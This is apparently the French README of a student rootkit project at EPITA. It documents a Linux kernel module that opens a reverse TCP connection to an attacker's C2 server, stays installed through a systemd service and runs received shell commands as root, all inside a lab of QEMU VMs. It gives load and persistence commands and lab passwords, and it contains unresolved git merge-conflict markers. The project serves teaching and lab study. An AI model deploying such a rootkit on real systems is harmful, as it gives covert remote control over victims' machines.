# WLKOM — Wild Linux Kernel Object Module

Rootkit pédagogique Linux développé dans le cadre du projet SYS2 (EPITA).  
Module kernel (LKM) qui s'installe sur une machine victime, établit une connexion TCP persistante vers un programme attaquant, et exécute les commandes reçues.

**Documentation complète :** [https://piafarah.github.io/rootkit-sys2](https://piafarah.github.io/rootkit-sys2)  
*(Guide d'installation, code expliqué, décisions de conception, tests)*  
*Pour la consulter en local, voir [Documentation locale](#documentation-locale) ci-dessous.*

---

## Démarrage rapide

```bash
# Prérequis (machine hôte Arch Linux)
sudo pacman -S qemu-full cdrtools wget

# ── Sur la machine HÔTE ─────────────────────────────────────────────────────

# Copier les sources dans le dossier partagé (une seule fois)
cp -r rootkit/ vmshare/
cp -r attacking_program/ vmshare/

# Lancer les VMs (deux terminaux)
./vm.sh attacker   # terminal 1
./vm.sh victim     # terminal 2

# ── Terminal 3 : SSH vers la VM ATTAQUANTE ───────────────────────────────────
ssh -p 10023 epita@localhost   # mdp: epita

# Compiler et lancer le C2
cd /mnt/vmshare/attacking_program && make
./c2 4444 test

# ── Terminal 4 : SSH vers la VM VICTIME ─────────────────────────────────────
ssh -p 10022 epita@localhost   # mdp: epita

# Compiler le module
cd /mnt/vmshare/rootkit && make

# Charger le module (première fois uniquement — la persistance prend le relais ensuite)
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

---

<<<<<<< HEAD
## Structure

```
rootkit/           — module kernel LKM (wlkom.c, Makefile, install_persistence.sh)
attacking_program/ — programme C2 userland (c2.c, Makefile)
tests/             — tests automatisés Python (run_tests.py)
vm.sh              — script QEMU/KVM pour créer et lancer les VMs
vmshare/           — dossier partagé hôte ↔ VMs (VirtFS/9p)
docs/              — source de la documentation MkDocs
```

## Documentation locale

Prérequis : Python 3.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r docs-requirements.txt
mkdocs serve
```

Ouvrir [http://127.0.0.1:8000](http://127.0.0.1:8000). La page se recharge automatiquement à chaque modification dans `docs/`.
=======
## Makefiles utiles

### Module kernel (`rootkit/Makefile`)

La compilation du module se fait **sur la VM victime** : les headers doivent correspondre exactement au kernel en cours d'exécution.

```bash
# Sur la VM victime
cd /mnt/vmshare/rootkit
make              # compile wlkom.ko
make modules      # compile wlkom.ko explicitement
make clean        # supprime les artefacts kernel
```

Cibles de service et de persistance :

```bash
make persistence  # compile puis lance install_persistence.sh
make start        # démarre wlkom.service
make stop         # arrête wlkom.service
make restart      # redémarre wlkom.service
make status       # affiche le statut systemd
make unload       # décharge le module wlkom
make uninstall    # retire service, config modprobe et .ko installé
make logs         # suit les logs kernel avec journalctl -k -f
```

`make persistence` utilise par défaut `C2_IP=192.168.100.10` et `C2_PORT=4444`. Pour changer ces valeurs :

```bash
make persistence C2_IP=<IP_ATTAQUANT> C2_PORT=<PORT>
```

**Pourquoi compiler sur la VM et non sur l'hôte ?**
Le Makefile utilise `/lib/modules/$(uname -r)/build`. Si on compile sur l'hôte Arch
(kernel 6.x rolling) pour une victim Debian (kernel 6.1 LTS), les headers ne matchent
pas et la compilation échoue ou produit un module incompatible.

### Programme C2 (`attacking_program/Makefile`)

La compilation du C2 se fait sur la VM attaquante :

```bash
cd /mnt/vmshare/attacking_program
make              # compile c2
make run          # compile si besoin puis lance ./c2 4444
make run PORT=5555
make rebuild      # clean puis rebuild
make clean        # supprime le binaire c2
```

---

## Chargement du module

Deux modes existent.

Mode manuel sans persistance, utile pour tester rapidement le `.ko` courant :

```bash
# Sur la VM victime
cd /mnt/vmshare/rootkit
make
sudo insmod wlkom.ko password_hash=<HASH_FNV1A> c2_ip=<IP_ATTAQUANT> c2_port=4444
sudo dmesg | tail    # vérifier "wlkom: loaded"

# Déchargement
make unload
```

Mode persistant, recommandé après validation :

```bash
# Sur la VM victime
cd /mnt/vmshare/rootkit
make persistence C2_IP=<IP_ATTAQUANT> C2_PORT=4444
make restart
make status
```

Dans ce mode, `password_hash`, `c2_ip` et `c2_port` sont stockés dans `/etc/modprobe.d/wlkom.conf`, puis appliqués automatiquement par `modprobe wlkom` au démarrage du service.

---
>>>>>>> main

## Tests

```bash
python3 tests/run_tests.py
```

<<<<<<< HEAD
## Auteurs

Voir [AUTHORS](AUTHORS).
=======
Ils vérifient les features déjà implémentées côté source : Makefile LKM pour `wlkom.ko`, logique de connexion reverse TCP avec retry, build du C2, obligation du mot de passe interactif côté C2, calcul FNV-1a, envoi de la trame `AUTH <hash_fnv1a>` et validation de l'authentification côté module kernel. Le chargement réel de `wlkom.ko` reste à tester dans la VM victime, car il dépend du kernel en cours et de ses headers.


## Features

### Compile (0.5pt) — DONE



Makefile LKM standard ciblant `wlkom.ko`.
Voir [rootkit/Makefile](rootkit/Makefile).

### Connection (3pt) — DONE

#### Fonctionnement

Au chargement du module (`insmod`), un **kthread kernel** (`wlkom_conn`) est lancé.
Il tourne en arrière-plan dans le kernel et gère le cycle de vie de la connexion TCP vers le C2.

```
insmod wlkom.ko
    └─ wlkom_init()
         └─ kthread_run(connection_thread)
                │
                ▼
         ┌─────────────────────────────────────────┐
         │  while (!kthread_should_stop())          │
         │                                          │
         │    do_connect()                          │
         │      sock_create(AF_INET, SOCK_STREAM)   │
         │      sock->ops->connect(c2_ip, c2_port)  │
         │                                          │
         │    si échec → pr_err + sleep 5s → retry  │
         │                                          │
         │    si succès → pr_info "connected"       │
         │      kernel_recvmsg() loop               │
         │        (bloquant, détecte déconnexion)   │
         │      ret == 0 → C2 fermé                 │
         │      ret < 0  → erreur réseau            │
         │      → shutdown + sock_release + retry   │
         └─────────────────────────────────────────┘
                │
         rmmod wlkom
              └─ wlkom_exit()
                   ├─ kernel_sock_shutdown()  ← débloque recvmsg
                   ├─ kthread_stop()          ← attend la fin du thread
                   └─ sock_release()
```

**Pourquoi `kernel_sock_shutdown` avant `kthread_stop` ?**
`kthread_stop` est bloquant — il attend que le thread retourne. Si le thread est bloqué
sur `kernel_recvmsg`, il n'en sort jamais sans une interruption externe. Le `shutdown`
ferme le socket côté kernel, ce qui fait retourner `recvmsg` avec une erreur,
permettant au thread de tester `kthread_should_stop()` et de sortir proprement.

**Pourquoi `schedule_timeout_interruptible` plutôt que `ssleep` pour le retry ?**
`schedule_timeout_interruptible` rend le thread interruptible pendant l'attente :
`kthread_stop` peut le réveiller immédiatement sans attendre les 5 secondes.
Avec `ssleep`, le `rmmod` bloquerait 5s à chaque retry en cours.

#### Paramètres

| Paramètre | Défaut | Description |
|---|---|---|
| `c2_ip` | `192.168.100.10` | IP de la VM attaquante (définie dans `vm.sh`) |
| `c2_port` | `4444` | Port TCP du C2 (défini dans `vm.sh`) |

Les valeurs par défaut correspondent à l'infra `vm.sh`. Les passer explicitement à l'`insmod`
n'est nécessaire que si on utilise une autre configuration réseau.

#### Fichiers

| Fichier | Rôle |
|---|---|
| [rootkit/wlkom.c](rootkit/wlkom.c) | Module kernel — kthread + socket TCP |
| [attacking_program/c2.c](attacking_program/c2.c) | Serveur C2 userland |
| [attacking_program/Makefile](attacking_program/Makefile) | Build du C2 |

#### Étapes pour tester la connexion

**1. Compiler et lancer le C2 sur la VM attaquante**

```bash
# SSH vers l'attaquant
ssh -p 10023 epita@localhost   # mdp : epita

# Compiler (une seule fois)
cd /mnt/vmshare/attacking_program && make

# Lancer le C2
./c2 4444
# → C2 listening on port 4444
# → [HH:MM:SS] [?] Waiting for rootkit connection...
```

**2. Compiler et charger le module sur la VM victime**

```bash
# SSH vers la victime (dans un autre terminal)
ssh -p 10022 epita@localhost   # mdp : epita

# Compiler (une seule fois, doit se faire sur la victime)
cd /mnt/vmshare/rootkit && make

# Charger le module en mode manuel, sans persistance
# Exemple pour le mot de passe epita : password_hash=afd071e5
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

**3. Vérifier la connexion**

Sur l'attaquant, le C2 affiche ensuite :
```text
[HH:MM:SS] [+] Rootkit connected from 192.168.100.20
WLKOM password:
[HH:MM:SS] [+] AUTH sent
[HH:MM:SS] [+] Authentication accepted
```

Le mot de passe est demandé côté C2 à chaque nouvelle connexion du rootkit. En mode manuel avec l'exemple ci-dessus, entrer `epita`.

Sur la victime, voir les logs kernel en temps réel :
```bash
sudo dmesg -w
# → wlkom: loaded
# → wlkom: connected to C2 192.168.100.10:4444
```

**4. Tester le retry**

Couper le C2 (`Ctrl+C`) — la victime affiche dans `dmesg` :
```
wlkom: disconnected from C2, retry in 5s
wlkom: C2 unreachable (-111), retry in 5s
...
```
Relancer `./c2 4444`, puis entrer le mot de passe quand le rootkit se reconnecte — reconnexion automatique sans toucher à la victime.

**5. Décharger le module**

```bash
# Sur la victime
sudo rmmod wlkom
# → dmesg : "wlkom: unloaded"
```

Sur l'attaquant :
```text
[!] Connection lost or rootkit disconnected.
[HH:MM:SS] [-] Rootkit disconnected
[HH:MM:SS] [?] Waiting for rootkit connection...
```

Le C2 surveille la socket avec `select()`, donc la perte de connexion est affichée même si aucune commande n'est tapée au prompt.

### Persistence (1.5pt) — DONE

La persistance est assurée par un service systemd installé sur la VM victime. Le service charge `wlkom` via `modprobe` après `network-online.target`, ce qui laisse le temps à l'interface `vmnet` d'être configurée avant que le module tente de joindre le C2.

Le script [rootkit/install_persistence.sh](rootkit/install_persistence.sh) automatise l'installation :

1. demande le mot de passe en interactif ;
2. calcule son hash FNV-1a 32-bit ;
3. copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/` ;
4. exécute `depmod -a` ;
5. écrit `/etc/modprobe.d/wlkom.conf` avec `password_hash`, `c2_ip` et `c2_port` ;
6. crée `/etc/systemd/system/wlkom.service` ;
7. active le service avec `systemctl enable`.

Exemple avec le mot de passe `epita` :

```bash
# Sur la VM victime
cd /mnt/vmshare/rootkit
make persistence
make start
make status
```

`make persistence` compile le module puis lance `install_persistence.sh` avec `C2_IP=192.168.100.10` et `C2_PORT=4444` par défaut. Pour une autre configuration :

```bash
make persistence C2_IP=<IP_ATTAQUANT> C2_PORT=<PORT>
```

Test après reboot :

```bash
# Sur l'attaquant
cd /mnt/vmshare/attacking_program
./c2 4444

# Sur la victime
sudo reboot
# après reconnexion SSH
lsmod | grep wlkom
sudo systemctl status wlkom.service
sudo dmesg | tail
```

Après le reboot, le rootkit est rechargé par `wlkom.service`. Côté attaquant, le C2 repasse en attente, reçoit la nouvelle connexion, puis redemande `WLKOM password:` avant de rouvrir le shell.

Le log attendu côté victime contient `wlkom: loaded`, puis `wlkom: C2 authenticated` lorsque le C2 est disponible.

Pour désinstaller complètement le rootkit de la victime :

```bash
cd /mnt/vmshare/rootkit
make uninstall
```

Équivalent détaillé :

```bash
# Arrêter le service persistant si présent
sudo systemctl disable --now wlkom.service

# Décharger le module si présent
sudo modprobe -r wlkom || sudo rmmod wlkom

# Supprimer la persistance systemd, la configuration modprobe et le module installé
sudo rm -f /etc/systemd/system/wlkom.service
sudo rm -f /etc/modprobe.d/wlkom.conf
sudo rm -f /lib/modules/$(uname -r)/extra/wlkom.ko

# Rafraîchir systemd et l'index des modules kernel
sudo systemctl daemon-reload
sudo depmod -a
```

Vérifications après désinstallation :

```bash
lsmod | grep wlkom        # ne doit rien afficher
systemctl status wlkom.service
ls /etc/modprobe.d/wlkom.conf
ls /lib/modules/$(uname -r)/extra/wlkom.ko
```


### Password (1pt) — DONE

Le module ne stocke pas le mot de passe brut. Il reçoit seulement un hash FNV-1a 32-bit via le paramètre kernel `password_hash`. Avec la persistance activée, `install_persistence.sh` demande le mot de passe en interactif, calcule le hash, écrit ce hash dans `/etc/modprobe.d/wlkom.conf`, puis `modprobe wlkom` le relit automatiquement quand `wlkom.service` démarre. Le script n'affiche pas le hash dans la console ; il reste seulement dans la configuration root `modprobe`.

Le module refuse de se charger si `password_hash` est absent ou vide (`-EINVAL`).

**Pourquoi un hash ?**
Le mot de passe brut n'est pas compilé dans `wlkom.ko` et n'est pas stocké comme paramètre module. Le module ne garde que le hash attendu. FNV-1a reste un hash simple non cryptographique, mais il suffit ici à ne pas transmettre/comparer directement le secret en clair.

**Pourquoi `module_param` ?**
C'est la façon idiomatique de passer de la configuration à un LKM sans hardcoder de valeur dans le binaire. Avec un mot de passe hardcodé, `strings wlkom.ko` l'exposerait immédiatement. Avec `module_param`, le `.ko` compilé ne contient aucun secret — le hash est fourni à l'exécution par l'opérateur qui charge le module ou par la configuration `modprobe`.

**Permissions sysfs (`0400`)** : le paramètre est lisible après chargement par root uniquement via `/sys/module/wlkom/parameters/password_hash`. Cela évite qu'un utilisateur non-privilégié puisse lire le hash depuis l'espace utilisateur.

À chaque connexion du rootkit, le C2 demande `WLKOM password:`, calcule le hash FNV-1a du mot de passe saisi et envoie `AUTH <hash_fnv1a>` avant toute commande. Le rootkit compare cette valeur avec le `password_hash` reçu au chargement et ferme la connexion si le hash est incorrect.

Exemple avec le mot de passe `epita`, dont le hash FNV-1a est `afd071e5`.

Mode persistant, recommandé après installation de la persistence :

```bash
# Sur l'attaquant
./c2 4444

# Sur la victime
cd /mnt/vmshare/rootkit
sudo ./install_persistence.sh 192.168.100.10 4444
# entrer epita quand le script demande WLKOM password
sudo systemctl restart wlkom.service
sudo dmesg | tail
```

Pour tester un mauvais mot de passe en mode persistant, installer volontairement un hash différent puis redémarrer le service :

```bash
# Sur la victime
cd /mnt/vmshare/rootkit
sudo ./install_persistence.sh 192.168.100.10 4444
# entrer wrongpass quand le script demande WLKOM password
sudo systemctl restart wlkom.service
sudo dmesg | tail
```

Le C2 lancé avec `./c2 4444`, puis le mot de passe `epita` saisi côté attaquant, enverra le hash de `epita`, mais le module attendra le hash de `wrongpass`, donc les logs doivent contenir `wlkom: C2 authentication failed`.

Mode manuel sans persistance, utile seulement pour un test rapide :

```bash
# Sur la victime
sudo systemctl stop wlkom.service
sudo rmmod wlkom
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

### Executing commands (5pt) — DONE

Une fois authentifié, le C2 ouvre un prompt interactif :

```text
=== WLKOM INTERACTIVE SHELL ===
Type your command and press Enter. Type 'exit' to quit.

c2_shell>
```

Chaque ligne saisie est envoyée telle quelle au module. Côté victime, `wlkom.c` exécute la commande via `/bin/sh -c` avec `call_usermodehelper(..., UMH_WAIT_PROC)`, attend la fin du processus, puis renvoie au C2 :

- le code de retour UNIX décodé ;
- le contenu de stdout ;
- le contenu de stderr ;
- le marqueur `--- End of Output ---` pour synchroniser la fin de réponse.

Exemple :

```text
c2_shell> echo hello
[Exit Status: 0]
--- STDOUT ---
hello
--- STDERR ---
--- End of Output ---
```

Les sorties sont capturées temporairement dans `/tmp/.wlkom_out` et `/tmp/.wlkom_err`, lues depuis le kernel avec `filp_open` / `kernel_read`, envoyées sur la socket C2, puis supprimées.

Si la victime reboot ou si la socket tombe pendant que le C2 attend au prompt, le C2 affiche immédiatement :

```text
[!] Connection lost or rootkit disconnected.
[HH:MM:SS] [-] Rootkit disconnected
[HH:MM:SS] [?] Waiting for rootkit connection...
```

Lorsque le rootkit persistant revient après reboot, le C2 redemande `WLKOM password:` avant de rouvrir le shell.

### Upload / Download (1.5pt + 1.5pt) — TODO

### Cardboard box / Hide (1pt + 2pt + 2pt) — TODO

### Crypto (1pt) — TODO

---

## Déploiement complet (étapes headmaster)

1. Préparer les VMs avec `./vm.sh attacker` puis `./vm.sh victim`.
2. Sur la VM attaquante : compiler et lancer le C2 avec `cd /mnt/vmshare/attacking_program && make && ./c2 4444`.
3. Montrer l'état initial : le C2 affiche `Waiting for rootkit connection...` tant que le rootkit n'est pas chargé.
4. Sur la VM victime : compiler le module avec `cd /mnt/vmshare/rootkit && make`.
5. Charger le rootkit en mode manuel avec `insmod`, ou installer la persistance avec `sudo ./install_persistence.sh 192.168.100.10 4444` puis `sudo systemctl start wlkom.service`.
6. Côté attaquant : le C2 affiche la connexion du rootkit, demande `WLKOM password:`, puis ouvre `c2_shell>` si le mot de passe est correct.
7. Tester `reboot` depuis `c2_shell>` : le C2 détecte la perte de connexion, repasse en attente, puis redemande le mot de passe quand le rootkit persistant revient.
8. Tester quelques commandes shell (`id`, `uname -a`, `ls`, etc.) et vérifier stdout, stderr et exit status.
>>>>>>> main
